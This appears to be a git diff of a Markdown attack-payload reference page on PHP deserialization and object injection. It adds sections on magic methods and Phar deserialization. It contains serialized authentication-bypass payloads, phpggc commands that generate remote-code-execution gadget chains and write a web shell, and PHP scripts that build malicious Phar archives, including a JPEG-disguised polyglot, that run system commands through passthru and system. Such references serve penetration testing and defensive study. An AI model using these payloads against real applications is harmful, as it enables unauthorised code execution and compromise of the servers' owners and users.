@@ -1,4 +1,4 @@
-# PHP Object injection
+# PHP Deserialization
 
 PHP Object Injection is an application level vulnerability that could allow an attacker to perform different kinds of malicious attacks, such as Code Injection, SQL Injection, Path Traversal and Application Denial of Service, depending on the context. The vulnerability occurs when user-supplied input is not properly sanitized before being passed to the unserialize() PHP function. Since PHP allows object serialization, attackers could pass ad-hoc serialized strings to a vulnerable unserialize() call, resulting in an arbitrary PHP object(s) injection into the application scope.
 
@@ -14,9 +14,10 @@ Also you should check the `Wrapper Phar://` in [File Inclusion](https://github.c
 
 * [General concept](#general-concept)
 * [Authentication bypass](#authentication-bypass)
+* [Object Injection](#object-injection)
 * [Finding and using gadgets](#finding-and-using-gadgets)
+* [Phar Deserialization](#phar-deserialization)
 * [Real world examples](#real-world-examples)
-* [PHP Phar Deserialization](#php-phar-deserialization)
 * [References](#references)
 
 ## General concept
@@ -82,13 +83,13 @@ a:2:{s:8:"username";b:1;s:8:"password";b:1;}
 
 Because `true == "str"` is true.
 
-### Object reference
+## Object Injection
 
 Vulnerable code:
 
 ```php
 <?php
-class Object
+class ObjectExample
 {
   var $guess;
   var $secretCode;
@@ -108,10 +109,10 @@ if($obj) {
 Payload:
 
 ```php
-O:6:"Object":2:{s:10:"secretCode";N;s:4:"guess";R:2;}
+O:13:"ObjectExample":2:{s:10:"secretCode";N;s:5:"guess";R:2;}
 ```
 
-We can do an array to like this:
+We can do an array like this:
 
 ```php
 a:2:{s:10:"admin_hash";N;s:4:"hmac";R:2;}
@@ -119,9 +120,16 @@ a:2:{s:10:"admin_hash";N;s:4:"hmac";R:2;}
 
 ## Finding and using gadgets
 
-Also called "PHP POP Chains", they can be used to gain RCE on the system.
+Also called `"PHP POP Chains"`, they can be used to gain RCE on the system.
 
-[PHPGGC](https://github.com/ambionics/phpggc) is a tool built to generate the payload based on several frameworks:
+* In PHP source code, look for `unserialize()` function.
+* Interesting [Magic Methods](https://www.php.net/manual/en/language.oop5.magic.php) such as `__construct()`, `__destruct()`, `__call()`, `__callStatic()`, `__get()`, `__set()`, `__isset()`, `__unset()`, `__sleep()`, `__wakeup()`, `__serialize()`, `__unserialize()`, `__toString()`, `__invoke()`, `__set_state()`, `__clone()`, and `__debugInfo()`:
+    * `__construct()`: PHP class constructor, is automatically called upon object creation
+    * `__destruct()`: PHP class destructor, is automatically called when references to the object are removed from memory
+    * `__toString()`: PHP call-back that gets executed if the object is treated like a string
+    * `__wakeup()` PHP call-back that gets executed upon deserialization
+
+[ambionics/phpggc](https://github.com/ambionics/phpggc) is a tool built to generate the payload based on several frameworks:
 
 - Laravel
 - Symfony
@@ -133,50 +141,79 @@ Also called "PHP POP Chains", they can be used to gain RCE on the system.
 
 ```powershell
 phpggc monolog/rce1 'phpinfo();' -s
+phpggc monolog/rce1 assert 'phpinfo()'
+phpggc swiftmailer/fw1 /var/www/html/shell.php /tmp/data
+phpggc Monolog/RCE2 system 'id' -p phar -o /tmp/testinfo.ini
 ```
 
-## PHP Phar Deserialization
+## Phar Deserialization
 
 Using `phar://` wrapper, one can trigger a deserialization on the specified file like in `file_get_contents("phar://./archives/app.phar")`.
 
 A valid PHAR includes four elements:
 
-1. Stub
-2. Manifest
-3. File Contents
-4. Signature
+1. **Stub**: The stub is a chunk of PHP code which is executed when the file is accessed in an executable context. At a minimum, the stub must contain `__HALT_COMPILER();` at its conclusion. Otherwise, there are no restrictions on the contents of a Phar stub.
+2. **Manifest**: Contains metadata about the archive and its contents.
+3. **File Contents**: Contains the actual files in the archive.
+4. **Signature**(optional): For verifying archive integrity.
 
-Example of a Phar creation in order to exploit a custom `PDFGenerator`.
 
-```php
-<?php
-class PDFGenerator { }
+* Example of a Phar creation in order to exploit a custom `PDFGenerator`.
+    ```php
+    <?php
+    class PDFGenerator { }
 
-//Create a new instance of the Dummy class and modify its property
-$dummy = new PDFGenerator();
-$dummy->callback = "passthru";
-$dummy->fileName = "uname -a > pwned"; //our payload
+    //Create a new instance of the Dummy class and modify its property
+    $dummy = new PDFGenerator();
+    $dummy->callback = "passthru";
+    $dummy->fileName = "uname -a > pwned"; //our payload
 
-// Delete any existing PHAR archive with that name
-@unlink("poc.phar");
+    // Delete any existing PHAR archive with that name
+    @unlink("poc.phar");
 
-// Create a new archive
-$poc = new Phar("poc.phar");
+    // Create a new archive
+    $poc = new Phar("poc.phar");
 
-// Add all write operations to a buffer, without modifying the archive on disk
-$poc->startBuffering();
+    // Add all write operations to a buffer, without modifying the archive on disk
+    $poc->startBuffering();
 
-// Set the stub
-$poc->setStub("<?php echo 'Here is the STUB!'; __HALT_COMPILER();");
+    // Set the stub
+    $poc->setStub("<?php echo 'Here is the STUB!'; __HALT_COMPILER();");
 
-/* Add a new file in the archive with "text" as its content*/
-$poc["file"] = "text";
-// Add the dummy object to the metadata. This will be serialized
-$poc->setMetadata($dummy);
-// Stop buffering and write changes to disk
-$poc->stopBuffering();
-?>
-```
+    /* Add a new file in the archive with "text" as its content*/
+    $poc["file"] = "text";
+    // Add the dummy object to the metadata. This will be serialized
+    $poc->setMetadata($dummy);
+    // Stop buffering and write changes to disk
+    $poc->stopBuffering();
+    ?>
+    ```
+
+* Example of a Phar creation with a `JPEG` magic byte header since there is no restriction on the content of stub.
+    ```php
+    <?php
+    class AnyClass {
+        public $data = null;
+        public function __construct($data) {
+            $this->data = $data;
+        }
+        
+        function __destruct() {
+            system($this->data);
+        }
+    }
+
+    // create new Phar
+    $phar = new Phar('test.phar');
+    $phar->startBuffering();
+    $phar->addFromString('test.txt', 'text');
+    $phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");
+
+    // add object of any class as meta data
+    $object = new AnyClass('whoami');
+    $phar->setMetadata($object);
+    $phar->stopBuffering();
+    ```
 
 
 ## Real world examples
@@ -197,6 +234,8 @@ $poc->stopBuffering();
 * [TSULOTT Web challenge write-up from MeePwn CTF 1st 2017 by Rawsec](https://rawsec.ml/en/meepwn-2017-write-ups/#TSULOTT-Web)
 * [CTF writeup: PHP object injection in kaspersky CTF](https://medium.com/@jaimin_gohel/ctf-writeup-php-object-injection-in-kaspersky-ctf-28a68805610d)
 * [Jack The Ripper Web challeneg Write-up from ECSC 2019 Quals Team France by Rawsec](https://rawsec.ml/en/ecsc-2019-quals-write-ups/#164-Jack-The-Ripper-Web)
-* [Rusty Joomla RCE Unserialize overflow](https://blog.hacktivesecurity.com/index.php?controller=post&action=view&id_post=41)
+* [Rusty Joomla RCE Unserialize overflow - Alessandro Groppo - October 3, 2019](https://blog.hacktivesecurity.com/index.php/2019/10/03/rusty-joomla-rce/)
 * [PHP Pop Chains - Achieving RCE with POP chain exploits. - Vickie Li - September 3, 2020](https://vkili.github.io/blog/insecure%20deserialization/pop-chains/)
 * [How to exploit the PHAR Deserialization Vulnerability - Alexandru Postolache - May 29, 2020](https://pentest-tools.com/blog/exploit-phar-deserialization-vulnerability/)
+* [phar:// deserialization - HackTricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion/phar-deserialization)
+* [Finding PHP Serialization Gadget Chain - DG'hAck Unserial killer - Aug 11, 2022 - xanhacks](https://www.xanhacks.xyz/p/php-gadget-chain/#introduction)
